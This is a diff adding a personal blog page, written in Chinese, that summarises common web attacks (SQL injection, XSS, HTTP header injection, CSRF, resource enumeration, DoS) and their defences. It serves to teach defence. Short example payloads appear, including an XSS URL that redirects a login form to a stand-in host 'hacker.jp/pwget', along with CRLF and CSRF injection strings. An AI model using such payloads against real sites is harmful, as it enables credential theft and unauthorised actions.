@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>web安全问题 | Sandy's blog</title>
+    
+    <!-- stylesheets -->
+    <link rel='stylesheet' href="../css/screen.css" type='text/css' />
+    <!--[if IE]> 
+        <link rel='stylesheet' href="css/ie.css" type='text/css' />
+    <![endif]-->
+    <!-- icon font -->
+    <link rel="stylesheet" type="text/css" href="../css/iconfont/iconfont.css">
+    <!-- emoji -->
+    <link rel="stylesheet" type="text/css" href="../css/emoji.css">
+</head>
+
+
+<body>
+<!-- header starts here -->
+<div class="header">
+    <!-- show clock -->
+    <div>
+        <canvas id="clock" width="100" height="100" class="draggable"></canvas>
+    </div>
+    <div class="foreground">
+        <div class="content">
+            <div class="header-logo">
+                <h1><a href="#">Sandy's blog</a></h1>
+            </div>
+            <div class="top-nav">
+                <ul class="nav1">
+                    <li id="all-articles"><a href="../index.html">首页</a></li>
+                    <li id="front-end-articles"><a href="../index.html#myArticles">前端学习</a>
+                        <ul id="article-nav">
+                            <li id="html-article"><a href="../index.html#myArticles">html</a></li>
+                            <li id="js-article"><a href="../index.html#myArticles">js</a></li>
+                            <li id="css-article"><a href="../index.html#myArticles">css</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="#">作品案例</a>
+                        <ul>
+                            <li>
+                            <a href="http://visg.nju.edu.cn/courseweb/" target="_blank">course page</a>
+                            </li>
+                            <li><a href="works/Shopping/index.html">Shopping</a></li>
+                            <li><a href="works/Roma/index.html">Roma</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="#">碎言碎语</a>
+                        <ul id="eassy">
+                            <li id="eassy-article"><a href="../index.html#myArticles">随记</a></li>
+                            <li><a href="aboutMe.html">关于我</a></li>
+                        </ul>
+                    </li>
+                </ul>
+            </div>
+            <div class="clearfix"> </div>
+        </div>
+    </div>
+</div>
+
+<!-- header ends here -->
+
+
+<!-- main content starts here -->
+<div class="main-content">
+    <h2 class="title">web安全问题</h2>
+    <div class="content-header">
+        <span class="icon-item"><span class="index-icon"><i class="iconfont icon-shijianaini"></i></span>发表于2017-04-24</span>
+        <span class="icon-item"><span class="index-icon"><i class="iconfont icon-liulan"></i></span>浏览<span data-hk-page="current"> - </span>次</span>
+        <span class="classified">分类于 <a href="#">前端学习</a> | <a href="#">web安全</a></span>
+    </div>
+    <div class="content-body">
+        <div class="part">
+            <h4>前言</h4>
+            <p>最近看了一本萌萌的书，叫《图解HTTP》，整本书用172张图解释了http协议里面的各种基础知识和概念，涉及http协议、信息、首部、状态码、web安全问题等。对于web安全问题，主要讲了几种web攻击技术，毕竟别人怎么攻击我们就要怎么预防。( 磨刀霍霍向猪羊的既视感<span class="emoji emoji263a"></span> )</p>
+            <h4>针对web的攻击技术</h4>
+            <p>目前，来自互联网的攻击大部分是冲着web站点来的，它们大部分把web应用作为攻击目标，所以我们把针对web应用的攻击技术作为重点。</p>
+            <ol>
+                <li>
+                    <h5>http不具备必要的安全功能</h5>
+                    <p>http就是一个通用的超文本传输协议，本身并没有加密处理或者会化管理这类的安全性功能，除非追加SSL协议等。</p>
+                </li>
+                <li>
+                    <h5>参数操纵攻击</h5>
+                    <ol>
+                        <li>
+                            <h5>SQL注入攻击</h5>
+                            <p>SQL注入攻击是指web应用使用的数据库，通过运行非法的SQL而产生的攻击，可能会导致个人信息甚至数据库所有信息泄露。</p>
+                            <p>以购物网站的搜索功能为例，现在将某个作者的名字作为关键词，查找该作者的所有著作：</p>
+<code><pre>
+http://example.com/q=lqq
+</pre></code>
+                            <p>SQL语句：</p>
+<code><pre>
+SELECT * FROM bookTable WHERE author='lqq' and flag=1
+</pre></code>
+                            <p><span class="inline-code">flag=1</span>代表可售的书籍。但是如果把查询字段的<span class="inline-code">'lqq'</span>改成<span class="inline-code">"lqq'--"</span>，由于--是SQL的注释语言，因此--后面的全视为注释，即 <span class="inline-code">and flag=1</span>这个条件被自动忽略了，这样就把原本不该显示的、尚未出版的图书也显示出来了。</p>
+                        </li>
+                        <li>
+                            <h5>OS命令注入攻击</h5>
+                            <p>OS命令注入攻击是指通过web应用，执行非法的操作系统命令达到攻击的目的。</p>
+                        </li>
+                        <li>
+                            <h5>跨站脚本攻击XSS</h5>
+                            <p>跨站脚本攻击是指通过存在安全漏洞的web网站注册用户的浏览器内运行非法的HTML标签或者JavaScript进行的一种攻击。动态创建的HTML部分有可能隐藏着安全漏洞。例如通过地址栏中URI的查询字段指定ID，即相当于在表单内自动填写字符串功能，并植入恶意JavaScript代码，诱使用户去点击。</p>
+<code><pre>
+http://example.jp/login?ID=">< script>var f=document.getElementBtId("login");
+f.action="http//hacker.jp/pwget";f.method="get"</ script>< span+s="
+</pre></code>
+                            <p>当用户在表单内输入ID和密码后，就会悄悄发送到攻击者的网站，导致个人信息被窃取。</p>
+                            <p>利用相同的方法，当然也可以窃取用户的Cookie数据。</p>
+                        </li>
+                        <li>
+                            <h5>HTTP首部注入攻击</h5>
+                            <p>HTTP首部注入攻击是指攻击者通过在响应首部字段加入换行，添加任意相应首部或实体的攻击模式。它可能导致设置任何的cookie信息，重定向至任意url或显示任意的主体等。</p>
+                            <p>例如，本来首部包含一个<span class="inline-code">Location</span>字段<span class="inline-code">Location:http://example.com/?cat=101</span>，攻击者把类别ID改成：</p>
+<code><pre>
+101%0D%0ASet-Cookie:+SID=123456789
+</pre></code>
+                            <p>那么，首部就变成了：</p>
+<code><pre>
+Location:http://example.com/?cat=101 (%0D%0A：换行符)
+Set-Cookie: SID=123456789
+</pre></code>            
+                            <p>此时，首部字段<span class="inline-code">Set-Cookie</span>已经生效。同样地，如果把两个<span class="inline-code">%0D%0A</span>插入字符串后面发送，就修改了http报文的主体部分。</p>
+                        </li>
+                        <strong>对于这几个攻击，我们需要做的自然是对提交参数的过滤，最好是前端过滤一遍，后端也过滤一遍（后端的过滤和拦截是最重要的，毕竟通过在浏览器禁用脚本的配置可以躲过前端的过滤）。</strong>
+                    </ol>
+                </li>
+                <li>
+                    <h5>资源枚举攻击</h5>
+                    <p>资源枚举攻击是指对本无意公开的文件目录，通过非法拦截其目录路径后，达成访问目的的一种攻击。别有用心的人会遍历你站点所有可访问的目录，然后把一些常见的备胎文件名（比如“sql.bak”、“index-副本.html”）一个个都枚举一下，如果运气好枚举到了就直接下载。</p>
+                    <strong>对于这资源枚举攻击，要把重要的东西要么放在外人不可访问的地方，要么应当给它起一个不那么好猜的名字，要么关闭对任意指定文件的访问权限。</strong>
+                </li>
+                <li>
+                    <h5>其它攻击</h5>
+                    <ol>
+                        <li>
+                            <h5>跨站点请求伪造CSRF</h5>
+                            <p>跨站点请求伪造是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新。</p>
+                            <p>举个例子，假设有一个图书馆网站，用户登陆了网站后只要没有关闭浏览器，在任何情况都可以作为一个已通过身份验证的用户来做购书、借书操作。此时我们向用户发送一封邮件，插入一张图片：</p>
+<code><pre>
+< img src='http://book.com/pay?bookid=100'/>
+</pre></code>
+                            <p>img、script、iframe标签都是不受同源策略限制的，假设你使用的邮箱很直白地给用户即时显示这张图片，而该用户又刚好登录了book.com且没有关闭浏览器，那么src里的连接就会立刻访问book.com/pay页面，并按照已通过身份验证的情况来处理，从而做了购书的操作。</p>
+                            <p>因此邮箱为了安全考虑，一般不会直接显示邮件里的图片哟。</p>
+                            <strong>对于CSRF攻击，我们所能做的可以有：
+                            1. 检查报头中的Referer参数确保请求发自正确的网站（但XHR请求可调用setRequestHeader方法来修改Referer报头）；
+                            2. 对于任何重要的请求都需要重新验证用户的身份；
+                            3. 创建一个唯一的令牌（Token），将其存在服务端的session中及客户端的cookie中，对任何请求，都检查二者是否一致。</strong>
+                        </li>
+                        <li>
+                            <h5>拒绝服务攻击Dos</h5>
+                            <p>拒绝服务（DoS）指的是向网站发起洪水一样的请求（Traffic Floor），导致服务器超负荷并关闭。</p>
+                            <p>众所周知，HTTP协议是运行在TCP协议之上的。一次TCP连接的建立需要三次握手，那么如果恶意建立TCP连接，并且拒绝最后一次握手呢？那么服务器的资源就一直被占用。如果有成千上万条恶意TCP连接，服务器的资源就会被消耗殆尽，也就不能向正常的请求提供服务了。</p>
+                            <strong>拒绝服务攻击的处理方法常规是采用QoS（Quality of Service）的软硬件解决方案。</strong>
+                        </li>
+                    </ol>
+                </li>
+            </ol>
+        </div>
+        <div class="part">
+            <h4>总结</h4>
+            <p>web安全问题是个很需要重视同时又很宽泛的问题。总体来讲，我们可以从下面几个点多加思考(这里是转的。。。)：</p>
+            <ol>
+                <li>永远不要相信客户端传来的任何信息，对这些信息都应先进行编码或过滤处理。</li>
+                <li>谨慎返回用户输入的信息。</li>
+                <li>使用黑名单和白名单处理（即“不允许哪些敏感信息”或“只允许哪些信息”，白名单的效果更好但局限性高）。</li>
+                <li>检查、验证请求来源，对每一个重要的操作都进行重新验证。</li>
+                <li>使用SSL防止第三方监听通信（但无法阻止XSS、CSRF、SQL注入攻击）。</li>
+                <li>不要将重要文件、备份文件存放在公众可访问到的地方。</li>
+                <li>会话ID无序化。</li>
+                <li>对用户上传的文件进行验证（不单单是格式验证，比方一张gif图片还应将其转为二进制并验证其每帧颜色值<无符号8位>和宽高值<无符号16位>）。</li>
+                <li>WSDL文档应当要求用户注册后才能获取。</li>
+            </ol>
+            <p>虽然我们有一些必要的手段来防止web攻击，但永远不会有一枚完美来彻底解决所有问题，先不谈那些数不胜数的已知的、可被攻击的漏洞，对于谜一样的未知漏洞，我们所能做的只是提前发现并及时修补它们。</p>
+        </div>
+    </div>
+    <div class="content-footer">
+        <a href="#" id="backToTopLink">
+            <span class="icon-text">
+                <i class="iconfont icon-guanjiaowangtubiao37"></i>
+            </span>
+            <span>回到顶部</span>
+        </a>
+        <a href="../index.html" id="backToHomeLink">
+            <span class="icon-text">
+                <i class="iconfont icon-fanhuishouye"></i>
+            </span>
+            <span>返回首页</span>
+        </a>
+    </div>
+</div>
+<!-- main content ends here -->
+
+
+<!-- footer starts here -->
+<div class="footer">
+    <p>Copyright &copy; 2017.Sandy All rights reserved.</p>      
+    <div class="clearfix"></div>
+</div>
+<!-- header ends here -->
+
+ <!-- scripts-->
+    <script src="../js/jquery-2.1.3.min.js" type="text/javascript"></script>
+    <script src="../js/bootstrap.min.js" type="text/javascript"></script>
+    <script src="../js/header.js" type="text/javascript"></script>
+    <!-- baidu map script -->
+    <script type="text/javascript" src = "http://webapi.amap.com/maps?v=1.3&key=e36412affa2229780f8d052a3249de45"></script>
+    <!-- text ellipsis -->
+    <script type="text/javascript" src="../js/jQuery.dot.js"></script>
+    <!-- back to top -->
+    <script type="text/javascript" src="../js/backToTop.js"></script>
+    <!-- show clock -->
+    <script type="text/javascript" src="../js/clock.js"></script> 
+    <!-- 底部导航栏，选择博客,按文章分类显示文章 -->
+    <script type="text/javascript" src="../js/pageNav.js"></script>
+    <!-- 统计博客访问次数 -->
+    <script src="https://cdn1.lncld.net/static/js/av-mini-0.6.10.js"></script>
+    <script src="http://jerry-cdn.b0.upaiyun.com/hit-kounter/hit-kounter-lc-0.2.0.js"></script>
+    <!-- 自定义事件 -->
+    <script type="text/javascript" src="../js/EventUtil.js"></script>
+    <!-- 移动元素 -->
+    <script type="text/javascript" src="../js/moveEle.js"></script>
+</body>
+</html>
